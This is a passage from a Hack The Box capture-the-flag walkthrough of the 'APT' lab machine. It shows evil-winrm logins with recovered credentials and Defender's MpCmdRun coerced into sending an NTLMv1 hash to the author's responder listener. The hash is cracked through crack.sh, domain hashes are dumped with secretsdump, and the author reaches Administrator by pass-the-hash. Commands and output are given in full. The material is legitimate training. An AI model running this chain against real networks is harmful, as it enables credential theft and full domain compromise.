
I reached the end of the file and found some minorly useful information.  I started doing some searches to see if I missed something

### Finding user creds

```
\Software\GiganticHostingManagementSystem\
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht
```

Searching for `Password` yeilded something that I had scrolled right past in my first look through.  There was a username and password `henry.vinson_adm:G1#Ny5@2dvht`


## Initial Foothold

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ evil-winrm -u henry.vinson_adm -p G1#Ny5@2dvht -i apt.htb.local                                1 ⨯

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== =============================================
htb\henry.vinson_adm S-1-5-21-2993095098-2100462451-206186470-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

AFter all that, I finally had a shell!  There were no useful or interesting groups or privileges.


### User.txt

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents> cd ../Desktop
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> ls


    Directory: C:\Users\henry.vinson_adm\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/31/2021   3:46 PM             34 user.txt


[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> type user.txt
0be8b33241a64934480a8ff868aca6ca
```

I found the proof that I had made it inside, on the users Desktop

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `henry.vinson_adm`

none of the exe versions of winPEAS worked on this machine, so I had to run the .bat.  I was also denied running `systeminfo`

The .bat version seemed to be stuck on a loop, so I started poking around manually while I waited, in another shell

```xml
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> type C:\Windows\Panther\unattend.xml 
<?xml version='1.0' encoding='utf-8'?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
   <settings pass="generalize" wasPassProcessed="true">
      <component name="Microsoft-Windows-PnpSysprep" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <PersistAllDeviceInstalls>true</PersistAllDeviceInstalls>
      </component>
   </settings>
   <settings pass="oobeSystem" wasPassProcessed="true">
      <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <OOBE>
            <SkipMachineOOBE>true</SkipMachineOOBE>
            <HideEULAPage>true</HideEULAPage>
            <SkipUserOOBE>true</SkipUserOOBE>
            <ProtectYourPC>1</ProtectYourPC>
         </OOBE>
         <TimeZone>GMT Standard Time</TimeZone>
         <AutoLogon>
            <Enabled>true</Enabled>
            <Username>Administrator</Username>
            <LogonCount>1</LogonCount>
            <Password>*SENSITIVE*DATA*DELETED*</Password>
            <Domain>apt</Domain>
         </AutoLogon>
         <UserAccounts>
            <AdministratorPassword>*SENSITIVE*DATA*DELETED*</AdministratorPassword>
         </UserAccounts>
         <FirstLogonCommands>
            <SynchronousCommand wcm:action="add">
               <CommandLine>net user dsc Password123! /add</CommandLine>
               <Order>1</Order>
            </SynchronousCommand>
            <SynchronousCommand wcm:action="add">
               <CommandLine>net localgroup administrators dsc /add</CommandLine>
               <Order>2</Order>
            </SynchronousCommand>
            <SynchronousCommand wcm:action="add">
               <CommandLine>winrm quickconfig -force</CommandLine>
               <Order>3</Order>
            </SynchronousCommand>
            <SynchronousCommand wcm:action="add">
               <CommandLine>powershell -Command 'Enable-PSRemoting -Force'</CommandLine>
               <Order>4</Order>
            </SynchronousCommand>
            <SynchronousCommand wcm:action="add">
               <CommandLine>powershell -File C:\lcm.ps1</CommandLine>
               <Order>5</Order>
            </SynchronousCommand>
            <SynchronousCommand wcm:action="add">
               <CommandLine>powershell -enc KABHAGUAdAAtAE4AZQB0AEEAZABhAHAAdABlAHIAIAB8ACAARABpAHMAYQBiAGwAZQAtAE4AZQB0AEEAZABhAHAAdABlAHIAQgBpAG4AZABpAG4AZwAgAC0AQwBvAG0AcABvAG4AZQBuAHQASQBEACAAbQBzAF8AdABjAHAAaQBwADYAIAAtAGMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQApAA==</CommandLine>
               <Order>6</Order>
            </SynchronousCommand>
         </FirstLogonCommands>
      </component>
   </settings>
   <settings pass="specialize" wasPassProcessed="true">
      <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <RegisteredOwner>Administrator</RegisteredOwner>
         <RegisteredOrganization>Managed by Terraform</RegisteredOrganization>
         <ComputerName>apt</ComputerName>
      </component>
      <component name="Microsoft-Windows-TCPIP" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <Interfaces>
            <Interface wcm:action="add">
               <Ipv4Settings>
                  <DhcpEnabled>false</DhcpEnabled>
               </Ipv4Settings>
               <UnicastIpAddresses>
                  <IpAddress wcm:action="add" wcm:keyValue="1">10.10.10.86/24</IpAddress>
               </UnicastIpAddresses>
               <Ipv6Settings>
                  <DhcpEnabled>true</DhcpEnabled>
               </Ipv6Settings>
               <Identifier>00-50-56-b4-b2-37</Identifier>
               <Routes>
                  <Route wcm:action="add">
                     <Identifier>1</Identifier>
                     <Prefix>0.0.0.0/0</Prefix>
                     <NextHopAddress>10.10.10.2</NextHopAddress>
                  </Route>
               </Routes>
            </Interface>
         </Interfaces>
      </component>
      <component name="Microsoft-Windows-DNS-Client" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <Interfaces>
            <Interface wcm:action="add">
               <Identifier>00-50-56-b4-b2-37</Identifier>
               <DNSServerSearchOrder>
                  <IpAddress wcm:action="add" wcm:keyValue="1">127.0.0.1</IpAddress>
               </DNSServerSearchOrder>
            </Interface>
         </Interfaces>
      </component>
      <component name="Microsoft-Windows-Deployment" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
         <RunSynchronous>
            <RunSynchronousCommand wcm:action="add">
               <Path>C:\sysprep\guestcustutil.exe restoreMountedDevices</Path>
               <Order>1</Order>
            </RunSynchronousCommand>
            <RunSynchronousCommand wcm:action="add">
               <Path>C:\sysprep\guestcustutil.exe flagComplete</Path>
               <Order>2</Order>
            </RunSynchronousCommand>
            <RunSynchronousCommand wcm:action="add">
               <Path>C:\sysprep\guestcustutil.exe deleteContainingFolder</Path>
               <Order>3</Order>
            </RunSynchronousCommand>
         </RunSynchronous>
      </component>
   </settings>
</unattend>

```

The output had mentioned a few interesting files.  The first I checked was C:\Windows\Panther\unattend.xml.  These unattend files can often hold plaintext credentials.  This administrator had been smart enough to remove his credentials afterwards.  

```
(Get-NetAdapter | Disable-NetAdapterBinding -ComponentID ms_tcpip6 -confirm:$false)
```

The base64 encoded command drew my attention.  It looked as if this was used to disable ipv6?

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> type C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
$Cred = get-credential administrator
invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
```

The powershell history file contained something interesting. The administrator credentials had been used to run a scriptblock that set the value of a registry key

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> echo $Cred
```

Nope. didnt work. darn lol

* https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level
* https://itconnect.uw.edu/wares/msinf/other-help/lmcompatibilitylevel/ntlmv1-removal-known-problems-and-workarounds/
* https://book.hacktricks.xyz/windows/ntlm 

Some reasearch revealed that 

> The Network security: LAN Manager authentication level setting determines which challenge/response authentication protocol is used for network logons. This choice affects the authentication protocol level that clients use, the session security level that the computers negotiate, and the authentication level that servers accept. 

```
Send NTLM response only | Client devices use NTLMv1 authentication, and they use NTLMv2 session security if the server supports it. Domain controllers accept LM, NTLM, and NTLMv2 authentication. | 2
```

A value of '2' meant that NTLM hashes would be sent

according to https://book.hacktricks.xyz/windows/ntlm I could abuse the print spooler service to get the machine to send the hash to my machine, where I could capture it with `responder`

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ sudo responder -I tun0 --lm           
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[!] The challenge must be exactly 16 chars long.
Example: 1122334455667788
```

The instructions on this page are not as well written as a lot of others on this page, but at least responder gave a verbose enough error message to fix the problem

* https://gbhackers.com/hackers-can-steal-windows-ntlm/
* https://github.com/Gl3bGl4z/All_NTLM_leak

The github account was a good list of different ways to leak NTLM hashes  I tried each one until I got one that wasn't henry


> Windows Defender MpCmdRun
> 
> `"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe" -Scan -ScanType 3 -File \\Server.domain\file.txt "c:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -url https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -path \\Server.domain\`


* https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus

> `-Scan [-ScanType [0\|1\|2\|3]] [-File <path> [-DisableRemediation] [-BootSectorScan] [-CpuThrottling]] [-Timeout <days>] [-Cancel]`	Scans for malicious software. Values for ScanType are: 0 Default, according to your configuration, -1 Quick scan, -2 Full scan, -3 File and directory custom scan.

remote share scanning? :)

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents\test> cd "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\"
Cannot find path 'C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\' because it does not exist.

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents\test> cd "C:\ProgramData\Microsoft\Windows Defender\platform\"
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\ProgramData\Microsoft\Windows Defender\platform> ls


    Directory: C:\ProgramData\Microsoft\Windows Defender\platform


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/10/2020  11:09 AM                4.18.2010.7-0
d-----        3/17/2021   3:13 PM                4.18.2102.4-0

```

The example on the page did not work, but I found two newer versions in the `/platform` folder.  I hoped that one would still be vulnerable to this issue

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0> ./MpCmdRun.exe -Scan -ScanType 3 -file \\10.10.14.187\test
Scan starting...
CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log for more information
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0> type C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log




-------------------------------------------------------------------------------------

MpCmdRun: Command Line: "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe" -Scan -ScanType 3 -File \\10.10.14.187:8081\file.txt

 Start Time:  Thu  Apr  01  2021 22:25:24



MpEnsureProcessMitigationPolicy: hr = 0x0

Starting RunCommandScan.

INFO: ScheduleJob is not set. Skipping signature update.

Scanning path as file: \\10.10.14.187:8081\file.txt.

Start: MpScan(MP_FEATURE_SUPPORTED, dwOptions=16385, path \\10.10.14.187:8081\file.txt, DisableRemediation = 0, BootSectorScan = 0, Timeout in days = 1)

MpScan() started

Warning: MpScan() encounter errror. hr = 0x80508023

MpScan() was completed

ERROR: MpScan(dwOptions=16385) Completion Failed 80508023

MpCmdRun.exe: hr = 0x80508023.

MpCmdRun: End Time:  Thu  Apr  01  2021 22:25:24

-------------------------------------------------------------------------------------





-------------------------------------------------------------------------------------

MpCmdRun: Command Line: "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe" -h

 Start Time:  Thu  Apr  01  2021 22:28:13



MpEnsureProcessMitigationPolicy: hr = 0x0

MpCmdRun: End Time:  Thu  Apr  01  2021 22:28:13

-------------------------------------------------------------------------------------





-------------------------------------------------------------------------------------

MpCmdRun: Command Line: "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe" -Scan -ScanType 3 -Path \\10.10.14.187\

 Start Time:  Thu  Apr  01  2021 22:28:56



MpEnsureProcessMitigationPolicy: hr = 0x0

Starting RunCommandScan.

MpCmdRun.exe: hr = 0x80070667.

MpCmdRun: End Time:  Thu  Apr  01  2021 22:28:56

-------------------------------------------------------------------------------------





-------------------------------------------------------------------------------------

MpCmdRun: Command Line: "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe" -Scan -ScanType 3 -file \\10.10.14.187\test

 Start Time:  Thu  Apr  01  2021 22:29:07



MpEnsureProcessMitigationPolicy: hr = 0x0

Starting RunCommandScan.

INFO: ScheduleJob is not set. Skipping signature update.

Scanning path as file: \\10.10.14.187\test.

Start: MpScan(MP_FEATURE_SUPPORTED, dwOptions=16385, path \\10.10.14.187\test, DisableRemediation = 0, BootSectorScan = 0, Timeout in days = 1)

MpScan() started

Warning: MpScan() encounter errror. hr = 0x80508023

MpScan() was completed

ERROR: MpScan(dwOptions=16385) Completion Failed 80508023

MpCmdRun.exe: hr = 0x80508023.

MpCmdRun: End Time:  Thu  Apr  01  2021 22:29:11

-------------------------------------------------------------------------------------
```

The scan failed

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ sudo responder -I tun0 --lm           
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [ON]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.187]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP']



[+] Listening for events...
[SMB] NTLMv1 Client   : 10.10.10.213
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788                                                          
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
```

However, I got a hit back on my listener!  I had the NTLMv1 hash of the user APT$

> Remember that the printer will use the computer account during the authentication, and computer accounts use long and random passwords that you probably won't be able to crack using common dictionaries. But the NTLMv1 authentication uses DES (more info here), so using some services specially dedicated to cracking DES you will be able to crack it (you could use https://crack.sh/ for example).

So this was the computer hash...I seem to remember reading this wasnt useful, but I tried to crack it anyway.  

* https://crack.sh/netntlm/

> There’s a number of articles on the LmCompatibilityLevel setting in Windows, but this will only work if a client has this setting at 2 or lower.

Looking good so far

* https://crack.sh/get-cracking/

```
NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
```

This is the format they wanted the hash submitted in.  

I entered a throwaway email address, and submitted the hash.  NTLMv1 hashes in the correct format are free.

```
Crack.sh has successfully completed its attack against your NETNTLM handshake. The NT hash for the handshake is included below, and can be plugged back into the 'chapcrack' tool to decrypt a packet capture, or to authenticate to the server:

Token: $NETNTLM$1122334455667788$95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
Key: d167c3238864b12f5f82feae86a7f798

This run took 32 seconds. Thank you for using crack.sh, this concludes your job.
```

I received an email very quickly from their server. It only took 32 seconds to find the hash in the rainbow table.  Now I just needed to figure out how to use the machine account hash...

* http://blog.carnal0wnage.com/2015/09/domain-controller-machine-account-to.html
* https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/

> `python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc LAB/DC2k8_1\$@172.16.102.15`

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ python3 /home/zweilos/.local/bin/secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 -just-dc HTB/APT\$@apt.htb.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf
[*] Cleaning up...
```

Using the template from the blog I was able to dump the hashes from the machine.  There were not nearly as many accounts as in the backup! :)

Now that I had the Administrator hash, it was time to crack it!

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ hashcat -O -D1,2 -a0 -m1000 admin.hash /usr/share/wordlists/rockyou.txt                      255 ⨯
hashcat (v6.1.1) starting...

...snipped...

Session..........: hashcat                       
Status...........: Exhausted
Hash.Name........: NTLM
Hash.Target......: c370bddf384a691d811ff3495e8a72e2
Time.Started.....: Thu Apr  1 18:11:53 2021 (5 secs)
Time.Estimated...: Thu Apr  1 18:11:58 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2957.7 kH/s (0.60ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 6538/14344385 (0.05%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[213134356173382a] -> $HEX[042a0337c2a156616d6f732103]

Started: Thu Apr  1 18:11:51 2021
Stopped: Thu Apr  1 18:11:59 2021
```

I was able to go through all of rockyou.txt in less than 10 seconds, but the password was not in it.  I decided to just try to use the hash to log in instead

```
┌──(zweilos㉿kali)-[~/htb/apt]
└─$ evil-winrm -u Administrator -H c370bddf384a691d811ff3495e8a72e2 -i apt.htb.local

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ============================================
htb\administrator S-1-5-21-2993095098-2100462451-206186470-500


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
HTB\Domain Admins                          Group            S-1-5-21-2993095098-2100462451-206186470-512 Mandatory group, Enabled by default, Enabled group
HTB\Group Policy Creator Owners            Group            S-1-5-21-2993095098-2100462451-206186470-520 Mandatory group, Enabled by default, Enabled group
HTB\Enterprise Admins                      Group            S-1-5-21-2993095098-2100462451-206186470-519 Mandatory group, Enabled by default, Enabled group
HTB\Schema Admins                          Group            S-1-5-21-2993095098-2100462451-206186470-518 Mandatory group, Enabled by default, Enabled group
HTB\Denied RODC Password Replication Group Alias            S-1-5-21-2993095098-2100462451-206186470-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> $env:username;$env:computername
Administrator
APT
```

Make sure to use `-H` for hash, and not `-p` for password!

### Root.txt

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> cd ../Desktop
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/1/2021   9:35 AM             34 root.txt


[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> cat root.txt
366c36e30001577410f0a8c5c89dbd15
```

After changing directories to the Desktop I was able to collect my proof!

Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.

If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
